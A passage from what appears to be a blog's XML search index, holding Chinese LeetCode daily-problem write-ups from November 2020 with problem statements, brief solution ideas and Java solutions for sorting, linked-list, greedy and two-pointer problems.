    <content type="text"><![CDATA[题目：164. 最大间距难度：困难 给定一个无序的数组，找出数组在排序之后，相邻元素之间最大的差值。 如果数组元素个数小于 2，则返回 0。 示例 1: 123输入: [3,6,9,1]输出: 3解释: 排序后的数组是 [1,3,6,9], 其中相邻元素 (3,6) 和 (6,9) 之间都存在最大差值 3。 示例 2: 123输入: [10]输出: 0解释: 数组元素个数小于 2，因此返回 0。 说明: 你可以假设数组中所有元素都是非负整数，且数值在 32 位有符号整数范围内。 请尝试在线性时间复杂度和空间复杂度的条件下解决此问题。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-gap著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 太菜了 工具人 只会用工具 解题代码1234567891011121314151617181920class Solution &#123; public int maximumGap(int[] nums) &#123; int ans = 0; if (nums.length &lt; 2) &#123; return ans; &#125; TreeSet&lt;Integer&gt; set = new TreeSet&lt;&gt;(); for (int i = 0;i &lt; nums.length;i++) &#123; set.add(nums[i]); &#125; List&lt;Integer&gt; tmp = new ArrayList&lt;&gt;(set); for (int i = 1;i &lt; tmp.size();i++) &#123; ans = Math.max(ans,tmp.get(i) - tmp.get(i - 1)); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/25]]></title>
    <url>%2Fposts%2Ffd5111c4%2F</url>
    <content type="text"><![CDATA[题目：1370. 上升下降字符串难度：简单 给你一个字符串 s ，请你根据下面的算法重新构造字符串： 从 s 中选出 最小 的字符，将它 接在 结果字符串的后面。 从 s 剩余字符中选出 最小 的字符，且该字符比上一个添加的字符大，将它 接在 结果字符串后面。 重复步骤 2 ，直到你没法从 s 中选择字符。 从 s 中选出 最大 的字符，将它 接在 结果字符串的后面。 从 s 剩余字符中选出 最大 的字符，且该字符比上一个添加的字符小，将它 接在 结果字符串后面。 重复步骤 5 ，直到你没法从 s 中选择字符。 重复步骤 1 到 6 ，直到 s 中所有字符都已经被选过。 在任何一步中，如果最小或者最大字符不止一个 ，你可以选择其中任意一个，并将其添加到结果字符串。 请你返回将 s 中字符重新排序后的 结果字符串 。 示例 1： 1234567输入：s = &quot;aaaabbbbcccc&quot;输出：&quot;abccbaabccba&quot;解释：第一轮的步骤 1，2，3 后，结果字符串为 result = &quot;abc&quot;第一轮的步骤 4，5，6 后，结果字符串为 result = &quot;abccba&quot;第一轮结束，现在 s = &quot;aabbcc&quot; ，我们再次回到步骤 1第二轮的步骤 1，2，3 后，结果字符串为 result = &quot;abccbaabc&quot;第二轮的步骤 4，5，6 后，结果字符串为 result = &quot;abccbaabccba&quot; 示例 2： 123输入：s = &quot;rat&quot;输出：&quot;art&quot;解释：单词 &quot;rat&quot; 在上述算法重排序以后变成 &quot;art&quot; 示例 3： 12输入：s = &quot;leetcode&quot;输出：&quot;cdelotee&quot; 示例 4： 12输入：s = &quot;ggggggg&quot;输出：&quot;ggggggg&quot; 示例 5： 12输入：s = &quot;spo&quot;输出：&quot;ops&quot; 提示： 1 &lt;= s.length &lt;= 500 s 只包含小写英文字母。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/increasing-decreasing-string著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟过程即可 解题代码1234567891011121314151617181920212223242526272829class Solution &#123; public String sortString(String s) &#123; StringBuilder builder = new StringBuilder(); int map[] = new int[26]; for (int i = 0;i &lt; s.length();i++) &#123; map[s.charAt(i) - 'a']++; &#125; while (builder.length() &lt; s.length()) &#123; for (int i = 0;i &lt; map.length;i++) &#123; if (map[i] &gt; 0) &#123; builder.append((char) (i + 'a')); map[i]--; &#125; &#125; for (int i = map.length - 1;i &gt;= 0;i--) &#123; if (map[i] &gt; 0) &#123; builder.append((char) (i + 'a')); map[i]--; &#125; &#125; &#125; return builder.toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>排序</tag>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/24]]></title>
    <url>%2Fposts%2F8a562152%2F</url>
    <content type="text"><![CDATA[题目：222. 完全二叉树的节点个数难度：中等 给出一个完全二叉树，求出该树的节点个数。 说明： 完全二叉树的定义如下：在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第 h 层，则该层包含 1~ 2h 个节点。 示例: 12345678输入: 1 / \ 2 3 / \ /4 5 6输出: 6 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/count-complete-tree-nodes著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接遍历一遍，完事 解题代码123456789101112131415161718192021/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int countNodes(TreeNode root) &#123; return dfs(root); &#125; private int dfs(TreeNode root) &#123; if (root == null) &#123; return 0; &#125; return 1 + dfs(root.left) + dfs(root.right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/23]]></title>
    <url>%2Fposts%2F1432b4f1%2F</url>
    <content type="text"><![CDATA[题目：452. 用最少数量的箭引爆气球难度：中等 在二维空间中有许多球形的气球。对于每个气球，提供的输入是水平方向上，气球直径的开始和结束坐标。由于它是水平的，所以纵坐标并不重要，因此只要知道开始和结束的横坐标就足够了。开始坐标总是小于结束坐标。 一支弓箭可以沿着 x 轴从不同点完全垂直地射出。在坐标 x 处射出一支箭，若有一个气球的直径的开始和结束坐标为 xstart，xend， 且满足 xstart ≤ x ≤ xend，则该气球会被引爆。可以射出的弓箭的数量没有限制。 弓箭一旦被射出之后，可以无限地前进。我们想找到使得所有气球全部被引爆，所需的弓箭的最小数量。 给你一个数组 points ，其中 points [i] = [xstart,xend] ，返回引爆所有气球所必须射出的最小弓箭数。 示例 1： 123输入：points = [[10,16],[2,8],[1,6],[7,12]]输出：2解释：对于该样例，x = 6 可以射爆 [2,8],[1,6] 两个气球，以及 x = 11 射爆另外两个气球 示例 2： 12输入：points = [[1,2],[3,4],[5,6],[7,8]]输出：4 示例 3： 12输入：points = [[1,2],[2,3],[3,4],[4,5]]输出：2 示例 4： 12输入：points = [[1,2]]输出：1 示例 5： 12输入：points = [[2,3],[2,3]]输出：1 提示： 0 &lt;= points.length &lt;= 104 points[i].length == 2 -231 &lt;= xstart &lt; xend &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-number-of-arrows-to-burst-balloons著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先按右端点排序，然后以右端点为界，贪心的射出最少的箭去覆盖气球即可 解题代码12345678910111213141516171819202122232425class Solution &#123; public int findMinArrowShots(int[][] points) &#123; int ans = 0; if (points.length &lt; 1) &#123; return ans; &#125; Arrays.sort(points, new Comparator&lt;int[]&gt;() &#123; public int compare(int[] a,int[] b) &#123; return Integer.compare(a[1],b[1]); &#125; &#125;); int min = points[0][1]; for(int i = 1; i &lt; points.length; i++) &#123; if(min &lt; points[i][0]) &#123; ans++; min = points[i][1]; &#125; &#125; return ans + 1; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/22]]></title>
    <url>%2Fposts%2F63358467%2F</url>
    <content type="text"><![CDATA[题目：242. 有效的字母异位词难度：简单 给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。 示例 1: 12输入: s = &quot;anagram&quot;, t = &quot;nagaram&quot;输出: true 示例 2: 12输入: s = &quot;rat&quot;, t = &quot;car&quot;输出: false 说明:你可以假设字符串只包含小写字母。 进阶:如果输入字符串包含 unicode 字符怎么办？你能否调整你的解法来应对这种情况？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/valid-anagram著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 建立哈希表即可 解题代码123456789101112131415161718192021222324252627class Solution &#123; public boolean isAnagram(String s, String t) &#123; if (s.length() != t.length()) &#123; return false; &#125; Map&lt;Character,Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0;i &lt; s.length();i++) &#123; char ch = s.charAt(i); if (map.containsKey(ch)) &#123; map.put(ch,map.get(ch) + 1); &#125; else &#123; map.put(ch,1); &#125; &#125; for (int i = 0;i &lt; t.length();i++) &#123; char ch = t.charAt(i); map.put(ch,map.getOrDefault(ch,0) - 1); if (map.get(ch) &lt; 0) &#123; return false; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>哈希表</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/21]]></title>
    <url>%2Fposts%2Ffa3cd5dd%2F</url>
    <content type="text"><![CDATA[题目：148. 排序链表难度：中等 给你链表的头结点 head ，请将其按 升序 排列并返回 排序后的链表 。 进阶： 你可以在 O(n log n) 时间复杂度和常数级空间复杂度下，对链表进行排序吗？ 示例 1： 12输入：head = [4,2,1,3]输出：[1,2,3,4] 示例 2： 12输入：head = [-1,5,3,4,0]输出：[-1,0,3,4,5] 示例 3： 12输入：head = []输出：[] 提示： 链表中节点的数目在范围 [0, 5 * 104] 内 -105 &lt;= Node.val &lt;= 105 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sort-list著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先A题，后面再优化 解题代码12345678910111213141516171819202122232425262728293031323334/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode sortList(ListNode head) &#123; if (head == null || head.next == null) &#123; return head; &#125; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); ListNode cur = head; while (cur != null) &#123; list.add(cur.val); cur = cur.next; &#125; Collections.sort(list); ListNode ans = new ListNode(0); cur = ans; for (int v : list) &#123; cur.next = new ListNode(v); cur = cur.next; &#125; return ans.next; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/20]]></title>
    <url>%2Fposts%2F8d3be54b%2F</url>
    <content type="text"><![CDATA[题目：147. 对链表进行插入排序难度：中等 对链表进行插入排序。 插入排序的动画演示如上。从第一个元素开始，该链表可以被认为已经部分排序（用黑色表示）。每次迭代时，从输入数据中移除一个元素（用红色表示），并原地将其插入到已排好序的链表中。 插入排序算法： 插入排序是迭代的，每次只移动一个元素，直到所有元素可以形成一个有序的输出列表。 每次迭代中，插入排序只从输入数据中移除一个待排序的元素，找到它在序列中适当的位置，并将其插入。 重复直到所有输入数据插入完为止。 示例 1： 12输入: 4-&gt;2-&gt;1-&gt;3输出: 1-&gt;2-&gt;3-&gt;4 示例 2： 12输入: -1-&gt;5-&gt;3-&gt;4-&gt;0输出: -1-&gt;0-&gt;3-&gt;4-&gt;5 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/insertion-sort-list著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 插入排序好像没什么好说的，题目已经把算法思想都告诉我们了 解题代码123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode insertionSortList(ListNode head) &#123; if (head == null || head.next == null) &#123; return head; &#125; ListNode node = new ListNode(-1); node.next = new ListNode(head.val); ListNode last = node.next; ListNode cur = head.next; while (cur != null) &#123; if (cur.val &gt;= last.val) &#123; last.next = cur; last = last.next; &#125; else &#123; ListNode insert = new ListNode(cur.val); ListNode pre = node; ListNode c = node.next; while (c.val &lt; insert.val) &#123; c = c.next; pre = pre.next; &#125; pre.next = insert; insert.next = c; last.next = null; &#125; cur = cur.next; &#125; return node.next; &#125;&#125; 辅助空间，两次遍历，快速排序 123456789101112131415161718192021222324252627/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode insertionSortList(ListNode head) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); ListNode cur = head; while (cur != null) &#123; list.add(cur.val); cur = cur.next; &#125; Collections.sort(list); cur = head; int index = 0; while (cur != null) &#123; cur.val = list.get(index); index++; cur = cur.next; &#125; return head; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/19]]></title>
    <url>%2Fposts%2Fdfca0e2c%2F</url>
    <content type="text"><![CDATA[题目：283. 移动零难度：简单 给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。 示例: 12输入: [0,1,0,3,12]输出: [1,3,12,0,0] 说明: 必须在原数组上操作，不能拷贝额外的数组。 尽量减少操作次数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/move-zeroes著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 思路一：把非0元素依次往前填，然后末尾补0；思路二：双指针，将右侧出现的第一个非0元素依次交换到左侧 解题代码思路一： 1234567891011121314151617class Solution &#123; public void moveZeroes(int[] nums) &#123; int index = 0; int cnt = 0; for (int i = 0;i &lt; nums.length;i++) &#123; if (nums[i] != 0) &#123; nums[index++] = nums[i]; &#125; else &#123; cnt++; &#125; &#125; while (cnt-- &gt; 0) &#123; nums[index++] = 0; &#125; &#125;&#125; 思路二： 1234567891011121314151617class Solution &#123; public void moveZeroes(int[] nums) &#123; int l = 0; int r = 0; while (r &lt; nums.length) &#123; if (nums[r] != 0) &#123; &#123; int t = nums[l]; nums[l] = nums[r]; nums[r] = t; &#125; l++; &#125; r++; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/18]]></title>
    <url>%2Fposts%2Fa8cd3eba%2F</url>
    <content type="text"><![CDATA[题目：134. 加油站难度：中等 在一条环路上有 N 个加油站，其中第 i 个加油站有汽油 gas[i] 升。 你有一辆油箱容量无限的的汽车，从第 i 个加油站开往第 i+1 个加油站需要消耗汽油 cost[i] 升。你从其中的一个加油站出发，开始时油箱为空。 如果你可以绕环路行驶一周，则返回出发时加油站的编号，否则返回 -1。 说明: 如果题目有解，该答案即为唯一答案。 输入数组均为非空数组，且长度相同。 输入数组中的元素均为非负数。 示例 1: 1234567891011121314输入: gas = [1,2,3,4,5]cost = [3,4,5,1,2]输出: 3解释:从 3 号加油站(索引为 3 处)出发，可获得 4 升汽油。此时油箱有 = 0 + 4 = 4 升汽油开往 4 号加油站，此时油箱有 4 - 1 + 5 = 8 升汽油开往 0 号加油站，此时油箱有 8 - 2 + 1 = 7 升汽油开往 1 号加油站，此时油箱有 7 - 3 + 2 = 6 升汽油开往 2 号加油站，此时油箱有 6 - 4 + 3 = 5 升汽油开往 3 号加油站，你需要消耗 5 升汽油，正好足够你返回到 3 号加油站。因此，3 可为起始索引。 示例 2: 12345678910111213输入: gas = [2,3,4]cost = [3,4,3]输出: -1解释:你不能从 0 号或 1 号加油站出发，因为没有足够的汽油可以让你行驶到下一个加油站。我们从 2 号加油站出发，可以获得 4 升汽油。 此时油箱有 = 0 + 4 = 4 升汽油开往 0 号加油站，此时油箱有 4 - 3 + 2 = 3 升汽油开往 1 号加油站，此时油箱有 3 - 3 + 3 = 3 升汽油你无法返回 2 号加油站，因为返程需要消耗 4 升汽油，但是你的油箱只有 3 升汽油。因此，无论怎样，你都不可能绕环路行驶一周。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/gas-station著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 贪心最难的是证明算法的正确性。。。题设有解一定唯一，因此问题简化为是否有解，而是否有解问题等价于总储油量是否 &gt; 总耗油量，然后问题的关键来了，如何找到这个起点呢？经过观察可以发现，这个问题的答案可以从示例一的解释里得到暗示，那就是油箱里的油量剩余量最小的时候，[4,8,7,6,5]对应[3,4,0,1,2]，剩下的可以看代码了 解题代码12345678910111213141516171819202122class Solution &#123; public int canCompleteCircuit(int[] gas, int[] cost) &#123; int len = gas.length; int surplus = 0; int minSurplus = Integer.MAX_VALUE; int minIndex = 0; for (int i = 0; i &lt; len; i++) &#123; surplus += gas[i] - cost[i]; if (surplus &lt; minSurplus) &#123; minSurplus = surplus; minIndex = i; &#125; &#125; if (surplus &lt; 0) &#123; return -1; &#125; return (minIndex + 1) % len; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/17]]></title>
    <url>%2Fposts%2F3872232b%2F</url>
    <content type="text"><![CDATA[题目：1030. 距离顺序排列矩阵单元格难度：简单 给出 R 行 C 列的矩阵，其中的单元格的整数坐标为 (r, c)，满足 0 &lt;= r &lt; R 且 0 &lt;= c &lt; C。 另外，我们在该矩阵中给出了一个坐标为 (r0, c0) 的单元格。 返回矩阵中的所有单元格的坐标，并按到 (r0, c0) 的距离从最小到最大的顺序排，其中，两单元格(r1, c1) 和 (r2, c2) 之间的距离是曼哈顿距离，|r1 - r2| + |c1 - c2|。（你可以按任何满足此条件的顺序返回答案。） 示例 1： 123输入：R = 1, C = 2, r0 = 0, c0 = 0输出：[[0,0],[0,1]]解释：从 (r0, c0) 到其他单元格的距离为：[0,1] 示例 2： 1234输入：R = 2, C = 2, r0 = 0, c0 = 1输出：[[0,1],[0,0],[1,1],[1,0]]解释：从 (r0, c0) 到其他单元格的距离为：[0,1,1,2][[0,1],[1,1],[0,0],[1,0]] 也会被视作正确答案。 示例 3： 1234输入：R = 2, C = 3, r0 = 1, c0 = 2输出：[[1,2],[0,2],[1,1],[0,1],[1,0],[0,0]]解释：从 (r0, c0) 到其他单元格的距离为：[0,1,1,2,2,3]其他满足题目要求的答案也会被视为正确，例如 [[1,2],[1,1],[0,2],[1,0],[0,1],[0,0]]。 提示： 1 &lt;= R &lt;= 100 1 &lt;= C &lt;= 100 0 &lt;= r0 &lt; R 0 &lt;= c0 &lt; C 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/matrix-cells-in-distance-order著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 自定义排序 解题代码12345678910111213141516171819202122232425class Solution &#123; public int[][] allCellsDistOrder(int R, int C, int r0, int c0) &#123; int[][] ans = new int[R * C][2]; int index = 0; for (int i = 0;i &lt; R;i++) &#123; for (int j = 0;j &lt; C;j++) &#123; ans[index][0] = i; ans[index][1] = j; index++; &#125; &#125; Arrays.sort(ans, new Comparator&lt;int[]&gt;() &#123; @Override public int compare(int[] a, int[] b) &#123; int d1 = Math.abs(a[0] - r0) + Math.abs(a[1] - c0); int d2 = Math.abs(b[0] - r0) + Math.abs(b[1] - c0); return d1 - d2; &#125; &#125;); return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/15]]></title>
    <url>%2Fposts%2Fd67c4207%2F</url>
    <content type="text"><![CDATA[题目：402. 移掉K位数字难度：中等 给定一个以字符串表示的非负整数 num，移除这个数中的 k 位数字，使得剩下的数字最小。 注意: num 的长度小于 10002 且 ≥ k。 num 不会包含任何前导零。 示例 1 : 123输入: num = &quot;1432219&quot;, k = 3输出: &quot;1219&quot;解释: 移除掉三个数字 4, 3, 和 2 形成一个新的最小的数字 1219。 示例 2 : 123输入: num = &quot;10200&quot;, k = 1输出: &quot;200&quot;解释: 移掉首位的 1 剩下的数字为 200. 注意输出不能有任何前导零。 示例 3 : 123输入: num = &quot;10&quot;, k = 2输出: &quot;0&quot;解释: 从原数字移除所有的数字，剩余为空就是0。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-k-digits著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 贪心的选取左边的比较大的数字删除即可 解题代码1234567891011121314151617181920212223242526272829class Solution &#123; public String removeKdigits(String num, int k) &#123; if (num.length() &lt;= k) &#123; return "0"; &#125; StringBuilder builder = new StringBuilder(num); while (k-- &gt; 0) &#123; int index = 0; for (int i = 1;i &lt; builder.length() &amp;&amp; builder.charAt(i) &gt;= builder.charAt(i - 1);i++) &#123; index = i; &#125; builder.deleteCharAt(index); while (builder.length() &gt; 1 &amp;&amp; builder.charAt(0) == '0') &#123; builder.deleteCharAt(0); &#125; &#125; if (builder.length() &lt; 1) &#123; return "0"; &#125; return builder.toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/14]]></title>
    <url>%2Fposts%2Fa17b7291%2F</url>
    <content type="text"><![CDATA[题目：1122. 数组的相对排序难度：简单 给你两个数组，arr1 和 arr2， arr2 中的元素各不相同 arr2 中的每个元素都出现在 arr1 中对 arr1 中的元素进行排序，使 arr1 中项的相对顺序和 arr2 中的相对顺序相同。未在 arr2 中出现过的元素需要按照升序放在 arr1 的末尾。 示例： 12输入：arr1 = [2,3,1,3,2,4,6,7,9,2,19], arr2 = [2,1,4,3,9,6]输出：[2,2,2,1,4,3,3,9,6,7,19] 提示： arr1.length, arr2.length &lt;= 1000 0 &lt;= arr1[i], arr2[i] &lt;= 1000 arr2 中的元素 arr2[i] 各不相同 arr2 中的每个元素 arr2[i] 都出现在 arr1 中 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/relative-sort-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 自定义排序 解题代码123456789101112131415161718192021222324252627class Solution &#123; public int[] relativeSortArray(int[] arr1, int[] arr2) &#123; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for(int num : arr1) &#123; list.add(num); &#125; for(int i = 0; i &lt; arr2.length; i++) &#123; map.put(arr2[i], i); &#125; Collections.sort(list, (x, y) -&gt; &#123; if(map.containsKey(x) || map.containsKey(y)) &#123; return map.getOrDefault(x, 1001) - map.getOrDefault(y, 1001); &#125; return x - y; &#125;); for(int i = 0; i &lt; arr1.length; i++) &#123; arr1[i] = list.get(i); &#125; return arr1; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/13]]></title>
    <url>%2Fposts%2F3f1fe732%2F</url>
    <content type="text"><![CDATA[题目：328. 奇偶链表难度：中等 给定一个单链表，把所有的奇数节点和偶数节点分别排在一起。请注意，这里的奇数节点和偶数节点指的是节点编号的奇偶性，而不是节点的值的奇偶性。 请尝试使用原地算法完成。你的算法的空间复杂度应为 O(1)，时间复杂度应为 O(nodes)，nodes 为节点总数。 示例 1: 12输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL输出: 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL 示例 2: 12输入: 2-&gt;1-&gt;3-&gt;5-&gt;6-&gt;4-&gt;7-&gt;NULL 输出: 2-&gt;3-&gt;6-&gt;7-&gt;1-&gt;5-&gt;4-&gt;NULL 说明: 应当保持奇数节点和偶数节点的相对顺序。 链表的第一个节点视为奇数节点，第二个节点视为偶数节点，以此类推。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/odd-even-linked-list著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 分离链表的奇偶节点后合并即可 解题代码1234567891011121314151617181920212223242526272829303132/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode oddEvenList(ListNode head) &#123; if (head == null || head.next == null) &#123; return head; &#125; ListNode o = head; ListNode e = head.next; ListNode oLast = e; while (o != null &amp;&amp; e != null &amp;&amp; e.next != null &amp;&amp; o.next != null) &#123; o.next = e.next; o = e.next; e.next = o.next; e = o.next; &#125; o.next = oLast; return head; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/12]]></title>
    <url>%2Fposts%2F4818d7a4%2F</url>
    <content type="text"><![CDATA[题目：922. 按奇偶排序数组 II难度：简单 给定一个非负整数数组 A， A 中一半整数是奇数，一半整数是偶数。 对数组进行排序，以便当 A[i] 为奇数时，i 也是奇数；当 A[i] 为偶数时， i 也是偶数。 你可以返回任何满足上述条件的数组作为答案。 示例： 123输入：[4,2,5,7]输出：[4,5,2,7]解释：[4,7,2,5]，[2,5,4,7]，[2,7,4,5] 也会被接受。 提示： 2 &lt;= A.length &lt;= 20000 A.length % 2 == 0 0 &lt;= A[i] &lt;= 1000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sort-array-by-parity-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 一次遍历，双指针分别填入奇偶位置即可 解题代码单开数组 12345678910111213141516171819class Solution &#123; public int[] sortArrayByParityII(int[] A) &#123; int[] ans = new int[A.length]; int e = 0; int o = 1; for (int i = 0;i &lt; A.length;i++) &#123; if (A[i] % 2 != 0) &#123; ans[o] = A[i]; o += 2; &#125; else &#123; ans[e] = A[i]; e += 2; &#125; &#125; return ans; &#125;&#125; 原地修改 1234567891011121314151617181920212223242526class Solution &#123; public int[] sortArrayByParityII(int[] A) &#123; int p = 0; int q = 1; int len = A.length; while (p &lt; len &amp;&amp; q &lt; len) &#123; while (p &lt; len &amp;&amp; A[p] % 2 == 0) &#123; p += 2; &#125; while (q &lt; len &amp;&amp; A[q] % 2 != 0) &#123; q += 2; &#125; if (p &lt; len &amp;&amp; q &lt; len) &#123; int t = A[p]; A[p] = A[q]; A[q] = t; &#125; &#125; return A; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/11]]></title>
    <url>%2Fposts%2Fd111861e%2F</url>
